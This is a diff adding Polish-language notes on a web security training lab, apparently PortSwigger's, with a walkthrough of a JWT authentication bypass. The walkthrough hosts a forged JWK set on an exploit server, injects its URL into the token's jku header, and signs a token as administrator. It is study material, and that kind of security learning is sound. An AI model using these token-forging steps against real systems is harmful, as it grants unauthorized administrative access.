@@ -671,3 +671,42 @@ Zasadniczo powinna istnieć white-lista kluczy, których może używać serwer, 
 2. Przechodzimy do Burp Reapeatera z zapyatniem na `/admin`
 3. W cookei modyfikujemy nazwę użytkownika na admin i klikamy Attack -> Embedded JWK i dodajemy wcześniej stworzony klucz.
 4. Taki token kopiujemy i wklejamy do cookie, aby już jako administrator zalogować się do panelu administracyjnego.
+
+# Lab: JWT authentication bypass via jku header injection
+Pole `jku` w JWT zawiera link do strony z kluczami, które należy użyć do weryfikacji podpisu. Jeśli nie jest ona odpowiednio weryfikowana można to wykorzystać do podania własnego klucza. Klucze są zapisane w takiej formie:
+```
+{
+    "keys": [
+	{
+	...
+	},
+	{
+	...
+	},
+	...
+    ]
+}
+```
+1. Tworzymy parę kluczy RSA
+2. Pobieramy klucz publiczny w formie JWT i kopiujemy go na exploit serwer w takiej formie:
+```
+{
+    "keys": [
+        {
+            "kty": "RSA",
+            "e": "AQAB",
+            "kid": "f761727b-5805-4415-a2af-cf5ba0200ce1",
+            "n": "yvjUSqZOS1FbHYEMh-0rTaIMRBqgyqDNmaqY7C5-aE3n_fnP-7w2eAAf75jKYfNKAMbTTclFtJo_OTdN9n2UMUlWLD59arujMdt3Gfuv220cyLC__mab84SYHf13Xcg8MGLrgMJDu-oCYMsJKza82hnyVNsH59C5507KYsma_qhCEjGKmEi-9e-lA6YzACGRO1_pmp7bQlX6QQ76OS7EnzLSmVTrMQSI04vv35rJN418gr4NVxoEzKBvlkToO2vbDCILgil4NEAZ8O_6nYsaR7qAVuJibq1CoeShjBWB8OGMlZpgKNzzPjUnFeMaFAOqpBMXgKdkIxxi37oBJPY5kQ"
+        }
+    ]
+}
+```
+3. Dodajemy w nagłówku payloadu link do strony w polu `jku` (należy je stworzyć)
+```
+{
+    "alg": "RS256",
+    "jku": "https://exploit-0ab400e40452efd5c0cf7ab4012d00c5.web-security-academy.net/exploit"
+}
+```
+4. Username podnieniamy na administrator, a gotowy payload podpisujemy wygenerowanym wcześniej kluczem
+5. Używamy payloadu do zalogowania
